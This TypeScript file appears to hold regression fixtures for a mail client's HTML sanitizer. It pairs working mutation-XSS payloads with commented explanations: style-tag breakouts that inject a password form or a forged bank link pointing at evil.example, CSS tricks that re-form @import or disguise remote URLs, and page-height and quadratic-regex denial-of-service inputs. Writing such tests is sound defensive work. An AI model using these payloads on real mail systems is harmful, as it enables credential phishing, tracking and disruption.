/**
 * THE PAYLOADS FOR THE 2026-08-04 ADVERSARIAL PASS ON `MessageBody.tsx`.
 *
 * Kept apart from `owner-billing-email.ts` for the reason that file states about itself: the
 * acceptance fixture must stay readable as *this is what a real message looks like*, and
 * `HOSTILE_HTML` must stay readable as *this is the vocabulary we refuse*. Neither of those
 * is what these are. **Every string here defeated the SHIPPED build in a real Chromium**, and
 * each one names the mechanism rather than a category.
 *
 * ── THE MECHANISM THEY ALL SHARE, EXCEPT THE LAST TWO ───────────────────────────────────
 *
 * A `<style>` element serializes its text RAW. The sanitizer used to rewrite that text AFTER
 * DOMPurify had cleared the document, and the rewrite worked by DELETION — so it could join
 * the two halves of a close tag that were never adjacent in the input. `<@import x;/style>`
 * carries no `</` at all until `@import x;` is removed, and DOMPurify's own markup probe
 * (`/<[/\w!]/`, `_isUnsafeNode`) had already run and seen `<@`, which it does not match.
 *
 * That is why every payload below hides its `/` behind a deletion: it is not an attack on
 * DOMPurify, it is an attack on the code that edited DOMPurify's output.
 */

/** Where every payload points. Nothing here may be requested, on any build. */
export const MXSS_HOST = "evil.example";

/** The one line that must survive, so a guard can tell "blocked" from "did not render". */
export const MXSS_SENTENCE = "Hello.";

/**
 * VERBATIM AS REPRODUCED. The acceptance case, and the tag list is the assertion.
 *
 * Shipped build, measured — `sanitizeMailHtml()` returned
 *   `<style></style><form action="https://evil.example/h"><input type=password></style>`
 * and the frame's own `contentDocument` held `["style","form","input"]`. A complete
 * credential prompt, inside the document whose header says the sanitizer exists to prevent
 * exactly that.
 */
export const MXSS_STYLE_BREAKOUT =
  `<style><@import x;/style><@import y;form action="https://${MXSS_HOST}/h">` +
  `<@import z;input type=password></style><p>${MXSS_SENTENCE}</p>`;

/**
 * THE SAME TRICK FROM `<head>`, because the head is not a different code path and must not
 * become one. `sanitizeMailHtml` hoists head stylesheets into the body before sanitizing
 * (otherwise every designed mail arrives unstyled); the hoist moves NODES, so whatever
 * protects the body case has to protect this one by construction rather than by a second
 * rule somebody has to remember.
 */
export const MXSS_HEAD_BREAKOUT =
  `<!DOCTYPE html><html><head>` +
  `<style><@import x;/style><@import y;form action="https://${MXSS_HOST}/head-h">` +
  `<@import z;input type=password></style>` +
  `</head><body><p>${MXSS_SENTENCE}</p></body></html>`;

/**
 * THE PART THAT IS NOT MERELY CONTAINED — and it is the reason the finding was not "the CSP holds".
 *
 * The frame's policy refuses the injected form's network access, and the sandbox refuses its
 * submission. It refuses NOTHING about a link. An `<a>` that materialises only when the frame
 * re-parses the document is annotated by nobody: no `rel`, no `target` of ours, no
 * `data-ohmail-host`, no mismatch marker — so it prints the host the SENDER chose next to a
 * destination of the sender's choosing, which is the entire affordance inverted.
 *
 * The forged `data-ohmail-host` is the point. `ALLOW_DATA_ATTR: false` refuses a sender's copy
 * of that attribute on a link the sanitizer parses; a link the sanitizer never parsed keeps it.
 * So the guard is not "is there a rel" — it is **does every `<a>`'s `data-ohmail-host` equal
 * the real host of its own `href`**, which no forgery can satisfy.
 */
export const MXSS_ANCHOR_INJECTION =
  `<p>${MXSS_SENTENCE}</p>` +
  `<a href="https://good.example/newsletter">Ordinary link</a>` +
  `<style><@import x;/style><@import y;a href="https://${MXSS_HOST}/login" ` +
  `target="_blank" rel="noopener noreferrer nofollow" data-ohmail-host="www.bank.example" ` +
  `title="Goes to www.bank.example">https://www.bank.example/secure</style>`;

/**
 * THE FIXED-POINT PAYLOAD — and it is the one that says why "the sanitizer has the last word"
 * is not on its own enough.
 *
 * Neutralising the stylesheet BEFORE DOMPurify puts every element the rewrite can invent
 * under the allow-list. It does nothing about a CSS construct the rewrite invents, because
 * the rewrite has already run. `@im` + `@import q;` + `port"…"` holds no `@import` until the
 * middle is removed; removing it re-forms one, and a `;`-separated substitution is what makes
 * that arithmetic impossible instead of merely unlikely.
 *
 * Shipped build: `@import"https://evil.example/x.css";` reached the frame and was requested.
 */
export const MXSS_IMPORT_REFORM =
  `<style>@im@import q;port"https://${MXSS_HOST}/reformed.css";</style>` +
  `<p>${MXSS_SENTENCE}</p>`;

/**
 * THE CLOSE TAG ASSEMBLED FROM THREE PIECES, NONE OF WHICH IS MARKUP.
 *
 * It is here because it defeats every narrow fix, including the one DOMPurify already has.
 * DOMPurify condemns a `<style>` whose text matches `/<[/\w!]/` — so a payload that writes
 * `</sty` and lets a deletion finish it is caught before the rewrite ever runs. This one never
 * writes `</` at all: it writes `<`, `/sty`, and `le>` as three separate fragments with an
 * `@import` between each pair. Both probes see `<@`, both pass, and the removals assemble
 * `</style>` out of pieces that were individually harmless.
 *
 * That is the whole argument for fixing the SUBSTITUTION rather than searching the input:
 * there is no string here to search for.
 *
 * Shipped build: an `<img>` with the sender's own remote `src`, in a fetching position, that
 * no part of the image blocker ever saw.
 */
export const MXSS_SPLIT_CLOSE_TAG =
  `<style><@import a;/sty@import b;le><@import c;img src="https://${MXSS_HOST}/split.png">` +
  `</style><p>${MXSS_SENTENCE}</p>`;

/**
 * THE THREE CSS SHAPES THAT REACHED THE NETWORK AND COUNTED AS ZERO.
 *
 *  · `image-set("…")` names an image with a bare string and no `url()` token at all.
 *  · `htt\70 s:` is `https:` written in CSS escapes. The CSS tokenizer decodes it; a regexp
 *    testing the raw text for `^https?://` does not.
 *  · `@import"…"` is legal CSS with no whitespace, and the old rule required `\s+`.
 *
 * Each was requested by Chromium and refused by the frame's `default-src 'none'` — so nothing
 * leaked — while `blocked` stayed empty and the reader was shown no notice at all. That is the
 * defect: the accounting layer said a thing had not happened.
 */
export const MXSS_CSS_SHAPES =
  `<style>` +
  `.a{background-image:image-set("https://${MXSS_HOST}/image-set.png" 1x)}` +
  `.b{background-image:url(htt\\70 s://${MXSS_HOST}/escaped.png)}` +
  `@import"https://${MXSS_HOST}/nospace.css";` +
  `</style><p class="a">${MXSS_SENTENCE}</p><p class="b">.</p>`;

/** Every url {@link MXSS_CSS_SHAPES} names, in the form the BROWSER resolves them to. */
export const MXSS_CSS_SHAPE_URLS = [
  `https://${MXSS_HOST}/image-set.png`,
  `https://${MXSS_HOST}/escaped.png`,
  `https://${MXSS_HOST}/nospace.css`,
] as const;

/**
 * A CHILD USING VIEWPORT UNITS. `html,body{height:auto!important}` says nothing about a
 * `<div>`, and inside the frame `150vh` is 1.5× the height the parent wrote a moment ago.
 * Measured on the shipped build: `frame.style.height` = **33554400px**, the host page's
 * `scrollHeight` many orders past any real page.
 */
export const MXSS_VH_CHILD = `<p>${MXSS_SENTENCE}</p><div style="height:150vh">tall</div>`;

/**
 * THE SAME RUNAWAY, DEFEATING THE FILE'S ONE `!important` HEAD-ON. Equal specificity,
 * and the sender's rule is later in the document, so it wins. Same measured 33554400px.
 */
export const MXSS_VH_IMPORTANT =
  `<style>html,body{height:300vh !important}</style><p>${MXSS_SENTENCE}</p>`;

/**
 * THE CEILING, ON ITS OWN. Nothing circular here at all: a message may simply DECLARE
 * itself 40 000 px tall in absolute units, and a measurement that is a pure function of the
 * content will faithfully report that height.
 *
 * It is a separate fixture because it is a separate claim. The probe viewport removes the
 * feedback edge; the cap is what answers "and what about the shape nobody has thought of",
 * and a cap no test crosses is a branch nobody has watched.
 */
export const MXSS_ABSURD_HEIGHT =
  `<p>${MXSS_SENTENCE}</p><div style="height:40000px">tall</div>`;

/**
 * THE QUADRATIC INPUT, built rather than stored: 500 KB of literal source in a fixture
 * would be a fixture nobody can read, and the SHAPE is the whole content of it.
 *
 * `[^'")]+` cannot cross `)`, so an input with no `)` makes every `url(` start scan to the end
 * of the string. It runs synchronously in `useMemo`, on the main thread, during render.
 * Measured against the shipped build: 125 KB → 6.1 s, 500 KB → 95.3 s.
 */
export function quadraticCss(bytes: number): string {
  return "url(".repeat(Math.ceil(bytes / 4));
}
